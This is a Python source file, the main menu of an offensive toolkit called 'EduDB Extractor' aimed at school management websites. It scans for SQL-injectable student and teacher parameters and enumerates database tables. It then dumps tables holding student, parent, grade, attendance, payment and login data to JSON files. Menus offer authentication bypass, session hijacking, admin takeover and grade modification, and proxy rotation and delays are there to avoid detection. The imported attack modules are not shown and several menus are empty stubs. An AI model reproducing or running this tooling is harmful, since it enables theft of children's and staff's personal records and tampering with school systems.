#!/usr/bin/env python3
# main.py - EduDB Extractor Main Menu
import os
import sys
import time
from recon.school_scanner import SchoolScanner
from exploit.sql_injector import SQLInjector
from extract.db_dumper import DBDumper
from analyze.data_analyzer import DataAnalyzer
from stealth.proxy_rotator import ProxyRotator

class EduDBExtractor:
    def __init__(self):
        self.proxy_rotator = ProxyRotator()
        self.scanner = SchoolScanner(self.proxy_rotator)
        self.injector = SQLInjector(self.proxy_rotator)
        self.dumper = DBDumper(self.proxy_rotator)
        self.analyzer = DataAnalyzer()
        self.target_url = ""
        self.session_data = {}
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
        ╔══════════════════════════════════════════════╗
        ║        EDUDB EXTRACTOR TOOLKIT v2.0          ║
        ║     School Database Dumping System           ║
        ║                                              ║
        ║  [🔥] Target: School Management Systems      ║
        ║  [📊] Data: Students, Teachers, Grades       ║
        ║  [🎯] Method: Multi-Vector Extraction        ║
        ╚══════════════════════════════════════════════╝
        """
        print(banner)
    
    def main_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            
            if self.target_url:
                print(f"\n[🎯] Current Target: {self.target_url}")
            
            print("\n" + "="*50)
            print("MAIN MENU")
            print("="*50)
            print("1. 🎯 Set Target Website")
            print("2. 🔍 Reconnaissance & Scanning")
            print("3. 🗡️ Exploit & Vulnerability Testing")
            print("4. 🗄️ Database Extraction")
            print("5. 📊 Data Analysis & Reporting")
            print("6. 🛡️ Stealth & Anti-Detection")
            print("7. 📁 View Extracted Data")
            print("8. 🚪 Exit")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.set_target()
            elif choice == '2':
                self.recon_menu()
            elif choice == '3':
                self.exploit_menu()
            elif choice == '4':
                self.extract_menu()
            elif choice == '5':
                self.analyze_menu()
            elif choice == '6':
                self.stealth_menu()
            elif choice == '7':
                self.view_data()
            elif choice == '8':
                print("\n[!] Cleaning up...")
                time.sleep(1)
                sys.exit(0)
            else:
                print("\n[!] Invalid option!")
                time.sleep(1)
    
    def set_target(self):
        print("\n" + "="*50)
        print("TARGET CONFIGURATION")
        print("="*50)
        
        url = input("Enter target school website URL (e.g., http://school.edu): ").strip()
        if not url.startswith('http'):
            url = 'http://' + url
        
        self.target_url = url
        self.session_data['target_url'] = url
        
        # Auto-detect school system
        print(f"\n[+] Testing connection to {url}...")
        if self.scanner.test_connection(url):
            print("[✓] Connection successful")
            
            # Detect CMS
            cms = self.scanner.detect_cms(url)
            if cms:
                print(f"[✓] Detected CMS: {cms}")
                self.session_data['cms'] = cms
            
            # Get basic info
            info = self.scanner.get_school_info(url)
            if info:
                print(f"[✓] School identified: {info.get('name', 'Unknown')}")
                self.session_data.update(info)
        else:
            print("[!] Connection failed")
        
        input("\nPress Enter to continue...")
    
    def recon_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("RECONNAISSANCE MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🔍 Full School System Scan")
            print("2. 📋 Enumerate School Pages")
            print("3. 🏫 Identify Student Portal")
            print("4. 👨‍🏫 Find Teacher/Admin Areas")
            print("5. 💾 Check Database Exposure")
            print("6. 🔐 Test Default Credentials")
            print("7. 📊 Generate Recon Report")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.full_scan()
            elif choice == '2':
                self.enumerate_pages()
            elif choice == '3':
                self.find_student_portal()
            elif choice == '4':
                self.find_admin_areas()
            elif choice == '5':
                self.check_db_exposure()
            elif choice == '6':
                self.test_default_creds()
            elif choice == '7':
                self.generate_recon_report()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def exploit_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("EXPLOIT MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 💉 SQL Injection Testing")
            print("2. 🚪 Authentication Bypass")
            print("3. 📁 Local File Inclusion (LFI)")
            print("4. 🔓 Session Hijacking")
            print("5. 🎯 Targeted Student Data Access")
            print("6. 👨‍💼 Teacher/Admin Account Takeover")
            print("7. 📝 Grade Modification Testing")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.sql_injection_test()
            elif choice == '2':
                self.auth_bypass_test()
            elif choice == '3':
                self.lfi_test()
            elif choice == '4':
                self.session_hijack_test()
            elif choice == '5':
                self.target_student_data()
            elif choice == '6':
                self.admin_takeover_test()
            elif choice == '7':
                self.grade_mod_test()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def extract_menu(self):
        while True:
            self.clear_screen()
            print("\n" + "="*50)
            print("DATABASE EXTRACTION MENU")
            print("="*50)
            print(f"Target: {self.target_url}")
            print("="*50)
            print("1. 🗄️ Dump Complete Database")
            print("2. 👨‍🎓 Extract Student Records")
            print("3. 👨‍🏫 Extract Teacher Records")
            print("4. 📊 Extract Grade Data")
            print("5. 🏠 Extract Address & Contact Info")
            print("6. 📅 Extract Attendance Records")
            print("7. 💰 Extract Financial Data (if any)")
            print("8. ↩️ Back to Main Menu")
            print("="*50)
            
            choice = input("\nSelect option [1-8]: ").strip()
            
            if choice == '1':
                self.dump_complete_db()
            elif choice == '2':
                self.extract_student_data()
            elif choice == '3':
                self.extract_teacher_data()
            elif choice == '4':
                self.extract_grade_data()
            elif choice == '5':
                self.extract_contact_data()
            elif choice == '6':
                self.extract_attendance_data()
            elif choice == '7':
                self.extract_financial_data()
            elif choice == '8':
                break
            else:
                print("[!] Invalid option!")
    
    def analyze_menu(self):
        # Analysis menu implementation
        pass
    
    def stealth_menu(self):
        # Stealth menu implementation
        pass
    
    def view_data(self):
        # Data viewing implementation
        pass
    
    # Implementasi metode-metode di atas
    def full_scan(self):
        print("\n[+] Starting full reconnaissance scan...")
        results = self.scanner.comprehensive_scan(self.target_url)
        self.session_data['scan_results'] = results
        
        print(f"\n[✓] Scan completed. Found:")
        print(f"    - Pages: {len(results.get('pages', []))}")
        print(f"    - Forms: {len(results.get('forms', []))}")
        print(f"    - Possible DB endpoints: {len(results.get('db_endpoints', []))}")
        
        input("\nPress Enter to continue...")
    
    def enumerate_pages(self):
        print("\n[+] Enumerating school website pages...")
        pages = self.scanner.enumerate_pages(self.target_url)
        
        print("\n[+] Found pages:")
        for i, page in enumerate(pages[:20], 1):
            print(f"  {i:2d}. {page}")
        
        if len(pages) > 20:
            print(f"  ... and {len(pages) - 20} more")
        
        self.session_data['enumerated_pages'] = pages
        input("\nPress Enter to continue...")
    
    def sql_injection_test(self):
        print("\n[+] Testing for SQL Injection vulnerabilities...")
        
        # Test common school system parameters
        test_params = [
            'student_id', 'nis', 'nisn', 'id_siswa',
            'teacher_id', 'id_guru', 'user_id', 'id',
            'class_id', 'id_kelas', 'subject_id'
        ]
        
        vulnerable = []
        for param in test_params:
            print(f"  Testing parameter: {param}")
            is_vuln = self.injector.test_parameter(self.target_url, param)
            if is_vuln:
                vulnerable.append(param)
                print(f"    [✓] VULNERABLE: {param}")
        
        if vulnerable:
            print(f"\n[!] Found {len(vulnerable)} vulnerable parameters!")
            self.session_data['sql_injection'] = vulnerable
            
            # Ask to exploit
            exploit = input("\nExploit vulnerable parameters? (y/n): ").lower()
            if exploit == 'y':
                self.exploit_sql_injection(vulnerable)
        else:
            print("\n[✓] No SQL injection vulnerabilities found")
        
        input("\nPress Enter to continue...")
    
    def exploit_sql_injection(self, vulnerable_params):
        print("\n[+] Starting SQL injection exploitation...")
        
        for param in vulnerable_params[:3]:  # Limit to 3
            print(f"\n  Exploiting: {param}")
            
            # Get database info
            db_info = self.injector.get_database_info(self.target_url, param)
            if db_info:
                print(f"    Database: {db_info.get('database')}")
                print(f"    Version: {db_info.get('version')}")
                self.session_data['db_info'] = db_info
            
            # Get tables
            tables = self.injector.get_tables(self.target_url, param)
            if tables:
                print(f"    Tables found: {len(tables)}")
                
                # Look for school-related tables
                school_tables = []
                for table in tables:
                    if any(keyword in table.lower() for keyword in ['siswa', 'student', 'guru', 'teacher', 'nilai', 'grade', 'kelas', 'class']):
                        school_tables.append(table)
                        print(f"      [🎯] {table}")
                
                if school_tables:
                    # Extract data from school tables
                    for table in school_tables[:2]:  # Limit to 2 tables
                        print(f"\n    Extracting from: {table}")
                        data = self.injector.dump_table(self.target_url, param, table, limit=10)
                        if data:
                            print(f"      Rows extracted: {len(data)}")
                            # Save to session
                            if 'extracted_data' not in self.session_data:
                                self.session_data['extracted_data'] = {}
                            self.session_data['extracted_data'][table] = data
        
        input("\nPress Enter to continue...")
    
    def dump_complete_db(self):
        print("\n[⚠️] WARNING: This will extract ALL database data")
        confirm = input("Are you sure? This may take a long time (y/n): ").lower()
        
        if confirm != 'y':
            return
        
        print("\n[+] Starting complete database dump...")
        
        # Check if we have SQL injection points
        if 'sql_injection' not in self.session_data:
            print("[!] No SQL injection points found. Run exploitation first.")
            input("\nPress Enter to continue...")
            return
        
        # Use first vulnerable parameter
        vuln_param = self.session_data['sql_injection'][0]
        
        # Get all tables
        print("[+] Enumerating all tables...")
        tables = self.injector.get_tables(self.target_url, vuln_param)
        
        if not tables:
            print("[!] Could not enumerate tables")
            return
        
        print(f"[+] Found {len(tables)} tables")
        
        # Filter for school-related tables
        school_tables = []
        for table in tables:
            table_lower = table.lower()
            if any(keyword in table_lower for keyword in [
                'siswa', 'student', 'murid', 'peserta',
                'guru', 'teacher', 'pengajar', 'dosen',
                'nilai', 'grade', 'score', 'raport',
                'kelas', 'class', 'jurusan', 'major',
                'orangtua', 'parent', 'wali',
                'absensi', 'attendance', 'kehadiran',
                'pembayaran', 'payment', 'finance',
                'user', 'account', 'akun', 'login'
            ]):
                school_tables.append(table)
        
        print(f"[🎯] Identified {len(school_tables)} school-related tables")
        
        # Dump each table
        all_data = {}
        for i, table in enumerate(school_tables, 1):
            print(f"\n[{i}/{len(school_tables)}] Dumping: {table}")
            
            try:
                data = self.injector.dump_table(self.target_url, vuln_param, table)
                if data:
                    all_data[table] = data
                    print(f"    Extracted {len(data)} rows")
                    
                    # Save to file
                    import json
                    filename = f"dump_{table}.json"
                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
                    print(f"    Saved to: {filename}")
                    
                    # Small delay to avoid detection
                    time.sleep(0.5)
            except Exception as e:
                print(f"    Error: {e}")
        
        self.session_data['complete_dump'] = all_data
        print(f"\n[✓] Complete dump finished. Extracted {len(all_data)} tables.")
        
        # Generate report
        self.generate_data_report(all_data)
        
        input("\nPress Enter to continue...")
    
    def generate_data_report(self, data):
        print("\n[+] Generating data analysis report...")
        
        total_records = 0
        student_count = 0
        teacher_count = 0
        
        for table_name, table_data in data.items():
            total_records += len(table_data)
            
            # Count students
            if any(keyword in table_name.lower() for keyword in ['siswa', 'student', 'murid']):
                student_count = len(table_data)
            
            # Count teachers
            if any(keyword in table_name.lower() for keyword in ['guru', 'teacher', 'pengajar']):
                teacher_count = len(table_data)
        
        print(f"\n📊 DATA ANALYSIS REPORT")
        print("="*40)
        print(f"Total tables extracted: {len(data)}")
        print(f"Total records: {total_records}")
        print(f"Student records: {student_count}")
        print(f"Teacher records: {teacher_count}")
        print("="*40)
        
        # Show sample data
        if data:
            first_table = list(data.keys())[0]
            print(f"\nSample from '{first_table}':")
            if data[first_table]:
                sample = data[first_table][0]
                for key, value in list(sample.items())[:5]:
                    print(f"  {key}: {value}")
        
        # Save report
        report = {
            'extraction_date': time.strftime("%Y-%m-%d %H:%M:%S"),
            'target_url': self.target_url,
            'tables_extracted': len(data),
            'total_records': total_records,
            'student_count': student_count,
            'teacher_count': teacher_count,
            'table_summary': {name: len(records) for name, records in data.items()}
        }
        
        import json
        with open('extraction_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n[✓] Report saved to: extraction_report.json")

if __name__ == "__main__":
    try:
        tool = EduDBExtractor()
        tool.main_menu()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
